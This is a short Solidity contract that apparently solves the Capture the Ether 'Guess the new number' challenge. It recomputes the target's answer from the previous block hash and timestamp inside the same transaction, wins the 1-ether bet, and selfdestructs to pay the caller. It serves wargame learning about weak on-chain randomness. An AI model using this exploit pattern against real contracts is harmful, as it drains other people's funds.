// SPDX-License-Identifier: MIT
pragma solidity ^0.4.22;

import "./GuessTheNewNumber.sol";

contract Attack {
    GuessTheNewNumberChallenge private target;

    constructor(address _address) public {
        target = GuessTheNewNumberChallenge(_address);
    }

    function pwn() external payable {
        require(msg.value == 1 ether);
        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now));

        target.guess.value(1 ether)(answer);

        selfdestruct(msg.sender);
    }

    function() public payable {}
}
